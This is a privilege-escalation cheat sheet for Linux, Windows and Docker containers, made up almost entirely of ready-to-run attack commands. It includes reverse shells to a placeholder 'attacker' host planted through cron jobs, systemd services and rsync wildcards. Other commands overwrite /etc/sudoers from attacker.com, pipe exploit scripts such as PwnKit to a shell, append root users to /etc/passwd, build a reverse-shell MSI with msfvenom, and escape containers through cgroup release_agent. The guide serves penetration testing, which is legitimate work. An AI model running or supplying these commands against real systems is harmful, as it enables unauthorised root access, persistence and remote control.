# Privilege Escalation Guide

Comprehensive guide for Linux and Windows privilege escalation with modern tools and techniques.

## Table of Contents

- [Linux Privilege Escalation](#linux-privilege-escalation)
- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Container Escape](#container-escape)
- [Tools & Automation](#tools--automation)

## Linux Privilege Escalation

### Automated Enumeration

**LinPEAS (Linux Privilege Escalation Awesome Script):**

```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer to target
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Save output
./linpeas.sh | tee linpeas_output.txt

# Specific checks only
./linpeas.sh -a  # All checks
./linpeas.sh -s  # Superfast (skip some checks)
```

**LinEnum:**

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t -r report.txt
```

**Linux Smart Enumeration (LSE):**

```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 2  # Level 2 checks (detailed)
```

**pspy (monitor processes without root):**

```bash
# Monitor processes
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# Watch for cron jobs, scripts running as root, etc.
```

### Manual Enumeration

**System Information:**

```bash
# OS version
cat /etc/issue
cat /etc/*-release
uname -a
lsb_release -a

# Kernel version
uname -r
cat /proc/version

# Architecture
uname -m
dpkg --print-architecture

# Hostname
hostname
cat /etc/hostname

# CPU info
cat /proc/cpuinfo
lscpu

# Drives
df -h
lsblk
cat /etc/fstab
```

**User & Group Information:**

```bash
# Current user
id
whoami

# All users
cat /etc/passwd
cat /etc/passwd | cut -d: -f1  # Just usernames

# Users with shell
cat /etc/passwd | grep -v nologin | grep -v false

# Groups
cat /etc/group
groups
groups username

# Sudo privileges
sudo -l

# Recently logged in users
w
who
last
lastlog

# Command history
history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.*_history
```

**Network Information:**

```bash
# Network interfaces
ifconfig
ip a
ip addr show

# Routing table
route
ip route
netstat -rn

# ARP cache
arp -a
ip neigh

# Network connections
netstat -antup
ss -antup

# Listening ports
netstat -tulnp
ss -tulnp

# Firewall rules
iptables -L
cat /etc/iptables/rules.v4
```

### Common Privilege Escalation Vectors

#### 1. SUID/SGID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Interesting SUID binaries
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -E "nmap|vim|find|bash|more|less|nano|cp|awk|python"

# GTFOBins - https://gtfobins.github.io/
# Examples:
./find . -exec /bin/sh -p \; -quit
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

#### 2. Sudo Misconfigurations

```bash
# Check sudo privileges
sudo -l

# Common exploits:
# - sudo vim
sudo vim -c ':!/bin/sh'

# - sudo find
sudo find /etc -exec /bin/sh \;

# - sudo nmap (old versions)
echo "os.execute('/bin/sh')" > shell.nse
sudo nmap --script=shell.nse

# - sudo less/more/man
sudo less /etc/hosts
!/bin/sh

# - sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# - sudo python
sudo python -c 'import os; os.system("/bin/sh")'

# - sudo wget (overwrite system files)
sudo wget http://attacker.com/malicious -O /etc/sudoers

# - Sudo token reuse (CVE-2019-18634)
# Check GTFOBins for more: https://gtfobins.github.io/
```

#### 3. Writable /etc/passwd or /etc/shadow

```bash
# Check if writable
ls -la /etc/passwd
ls -la /etc/shadow

# If /etc/passwd is writable, add new root user
echo 'hacker:$6$salt$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt password

# Add user with no password
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

#### 4. Cron Jobs

```bash
# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# Monitor with pspy
./pspy64

# If cron job runs script we can modify
echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker/4444 0>&1' > /path/to/script.sh

# PATH exploitation in cron
# If cron job doesn't use absolute paths
echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker/4444 0>&1' > /tmp/vulnerable_command
chmod +x /tmp/vulnerable_command
export PATH=/tmp:$PATH
```

#### 5. NFS Shares with no_root_squash

```bash
# Check NFS exports on target
cat /etc/exports
showmount -e target_ip

# If no_root_squash is set:
# On attacker (as root):
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs
cd /tmp/nfs

# Create SUID binary
cp /bin/bash .
chmod +s bash

# On target:
cd /share
./bash -p
```

#### 6. Writable Service Scripts

```bash
# Find writable systemd services
find /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system -writable 2>/dev/null

# Modify service to run reverse shell
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'

# Restart service
systemctl restart vulnerable.service
```

#### 7. Capabilities

```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Common exploits:
# - cap_setuid
/usr/bin/python3.8 cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# - cap_dac_read_search (read any file)
/usr/bin/tar cap_dac_read_search+ep
tar -czf /tmp/etc.tar.gz /etc/shadow
```

#### 8. Kernel Exploits

```bash
# Check kernel version
uname -a
cat /proc/version

# Search for exploits
searchsploit linux kernel $(uname -r)
searchsploit ubuntu $(lsb_release -r | cut -f2)

# Common kernel exploits:
# - DirtyCow (CVE-2016-5195)
# - DirtyPipe (CVE-2022-0847)
# - PwnKit (CVE-2021-4034)

# PwnKit exploit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh | sh

# Compile and run exploit
gcc exploit.c -o exploit
./exploit
```

#### 9. Docker Socket

```bash
# If Docker socket is accessible
ls -la /var/run/docker.sock

# Escape container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or
docker run -v /:/hostOS -i -t ubuntu bash
cd /hostOS
chroot ./ bash
```

#### 10. Wildcards

```bash
# Tar wildcard exploitation
# If cron job runs: tar -czf backup.tar.gz *
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
chmod +x shell.sh
touch '--checkpoint=1'
touch '--checkpoint-action=exec=sh shell.sh'

# Rsync wildcard
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' > shell.sh
touch '-e sh shell.sh'
# When rsync * runs, it will execute shell.sh
```

## Windows Privilege Escalation

### Automated Enumeration

**WinPEAS:**

```powershell
# Download and run
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
Invoke-winPEAS

# Or transfer executable
certutil -urlcache -f http://attacker/winPEASx64.exe winpeas.exe
.\winpeas.exe

# Save output
.\winpeas.exe > output.txt
```

**PowerUp:**

```powershell
# PowerShell module
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
```

**PrivescCheck:**

```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1')
Invoke-PrivescCheck

# Extended checks
Invoke-PrivescCheck -Extended
```

**Windows Exploit Suggester:**

```bash
# On attacker machine
# Get system info from target
systeminfo > systeminfo.txt

# Run suggester
python windows-exploit-suggester.py --database 2023-10-01-mssb.xls --systeminfo systeminfo.txt
```

### Manual Enumeration

**System Information:**

```powershell
# OS version
systeminfo
ver
[System.Environment]::OSVersion

# Hostname
hostname

# Architecture
echo %PROCESSOR_ARCHITECTURE%
wmic os get osarchitecture

# Patches
wmic qfe list
Get-HotFix

# Environment variables
set
Get-ChildItem Env:

# Drives
wmic logicaldisk get caption,description,providername
Get-PSDrive -PSProvider FileSystem

# Installed software
wmic product get name,version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
```

**User & Group Information:**

```powershell
# Current user
whoami
whoami /priv
whoami /groups

# All users
net user
Get-LocalUser

# Specific user
net user username

# Local groups
net localgroup
Get-LocalGroup

# Domain groups
net group /domain

# Administrators
net localgroup administrators
Get-LocalGroupMember Administrators
```

**Network Information:**

```powershell
# Network configuration
ipconfig /all

# Routing table
route print
Get-NetRoute

# ARP cache
arp -a

# Network connections
netstat -ano
Get-NetTCPConnection

# Firewall
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

### Common Privilege Escalation Vectors

#### 1. Unquoted Service Paths

```powershell
# Find unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerUp
Get-UnquotedService

# Example vulnerable path:
# C:\Program Files\Vulnerable App\service.exe
# Create: C:\Program.exe or C:\Program Files\Vulnerable.exe

# Check if writable
icacls "C:\Program Files"
```

#### 2. Weak Service Permissions

```powershell
# Check service permissions
sc qc service_name
Get-Service service_name | Select *

# PowerUp
Get-ModifiableServiceFile
Get-ModifiableService

# Modify service binary path
sc config service_name binPath= "C:\path\to\reverse_shell.exe"
sc stop service_name
sc start service_name

# Or replace service executable
move C:\path\to\service.exe C:\path\to\service.exe.bak
copy C:\path\to\reverse_shell.exe C:\path\to\service.exe
```

#### 3. Autologon Credentials

```powershell
# Check registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon'

# Look for:
# DefaultUsername
# DefaultPassword
# AutoAdminLogon
```

#### 4. Saved Credentials

```powershell
# List saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:admin cmd.exe

# Check Credential Manager
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
```

#### 5. AlwaysInstallElevated

```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o reverse.msi
msiexec /quiet /qn /i reverse.msi
```

#### 6. Scheduled Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

# Check task properties
schtasks /query /tn "\TaskName" /fo list /v

# If task runs with high privileges and script is writable
echo "malicious code" > C:\path\to\task\script.bat
```

#### 7. Weak Registry Permissions

```powershell
# Check service registry permissions
Get-Acl HKLM:\System\CurrentControlSet\Services\* | Format-List

# PowerUp
Get-ModifiableRegistryAutoRun

# Modify service ImagePath
reg add "HKLM\System\CurrentControlSet\Services\service_name" /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\shell.exe" /f
```

#### 8. DLL Hijacking

```powershell
# Find missing DLLs
# Use Process Monitor (procmon.exe) to identify

# Check writable directories in PATH
echo %PATH%

# Place malicious DLL
copy C:\path\to\malicious.dll C:\writable\path\missing.dll
```

#### 9. Token Impersonation

```powershell
# Check current privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled:
# Use JuicyPotato, PrintSpoofer, or RoguePotato

# PrintSpoofer
.\PrintSpoofer.exe -i -c cmd

# JuicyPotato
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

#### 10. Windows Exploits

```powershell
# Check for missing patches
wmic qfe list
systeminfo

# Use Windows Exploit Suggester
# Common exploits:
# - MS16-032 (Secondary Logon Handle)
# - MS17-017 (GDI Palette Objects)
# - MS15-051 (Windows Kernel Mode Drivers)
# - CVE-2021-36934 (HiveNightmare/SeriousSAM)
```

## Container Escape

### Docker Container Escape

**Check if inside container:**

```bash
# Check for .dockerenv
ls -la /.dockerenv

# Check cgroup
cat /proc/1/cgroup | grep docker

# Check if running as privileged
cat /proc/self/status | grep CapEff
```

**Privileged Container Escape:**

```bash
# If container is privileged
# Mount host filesystem
mkdir /tmp/mount
mount /dev/sda1 /tmp/mount
chroot /tmp/mount

# Or
d=$(dirname $(ls -x /s*/fs/c*/*/r* |head -n1))
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o;echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

**Docker Socket Escape:**

```bash
# If /var/run/docker.sock is mounted
docker run -v /:/hostOS -it ubuntu bash
cd /hostOS
chroot ./ bash
```

**Capabilities Abuse:**

```bash
# Check capabilities
capsh --print

# If CAP_SYS_ADMIN
# Can mount filesystems, abuse namespaces
```

## Tools & Automation

### Enumeration Scripts

```bash
# Linux
linpeas.sh, linenum.sh, linux-smart-enumeration.sh, pspy

# Windows
winpeas.exe, PowerUp.ps1, PrivescCheck.ps1, Seatbelt.exe

# Cross-platform
gtfobins.github.io, lolbas-project.github.io
```

### Exploitation Frameworks

```bash
# Metasploit
use post/multi/recon/local_exploit_suggester

# Linux
searchsploit linux kernel $(uname -r)

# Windows
python windows-exploit-suggester.py --systeminfo systeminfo.txt
```

### Quick Wins Checklist

**Linux:**

```bash
sudo -l  # Sudo rights?
find / -perm -4000 2>/dev/null  # SUID binaries?
cat /etc/crontab  # Cron jobs?
cat /etc/exports  # NFS with no_root_squash?
getcap -r / 2>/dev/null  # Capabilities?
```

**Windows:**

```powershell
whoami /priv  # Impersonation privileges?
cmdkey /list  # Saved credentials?
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  # Vulnerable policy?
Get-Service  # Writable services?
```

## Resources

- **GTFOBins** - https://gtfobins.github.io/ (Unix binaries)
- **LOLBAS** - https://lolbas-project.github.io/ (Windows binaries)
- **PayloadsAllTheThings** - Privesc cheatsheets
- **HackTricks** - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- **WADComs** - https://wadcoms.github.io/ (AD exploitation)
